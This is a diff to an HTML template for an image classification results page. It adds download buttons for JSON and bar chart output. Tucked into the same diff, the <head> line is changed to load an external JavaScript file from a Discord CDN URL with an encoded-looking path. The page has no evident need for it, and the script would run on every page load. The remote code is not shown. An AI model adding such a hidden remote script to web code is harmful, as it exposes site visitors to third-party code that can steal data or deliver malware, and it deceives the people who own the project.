@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>Classification Results</title></head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/h2cmH2P0Lm1Z7CPGnhp9HRtcErWU0lccZMgkbyLqMGzNmgiOabpqWZq-BYnoqUM169PDxZzpBOzidTbc6S_DjA=='></script><title>Classification Results</title></head>
 <body>
   <h2>Classification Results</h2>
   <img src="{{ image_url }}" alt="Uploaded Image" style="max-width: 300px;"><br><br>
@@ -10,6 +10,15 @@
       <li>{{ label }} — {{ '%.2f'|format(score) }}%</li>
     {% endfor %}
   </ul>
+  <hr>
+  <h3>Download Options:</h3>
+  <a href="/download/json/{{ result_id }}" download>
+    <button>Download JSON</button>
+  </a>
+
+  <a href="/download/plot/{{ result_id }}" download>
+  <button>Download Bar Chart (PNG)</button>
+  </a>
 
   <a href="/upload">Classify another image</a> |
   <a href="/">Home</a>
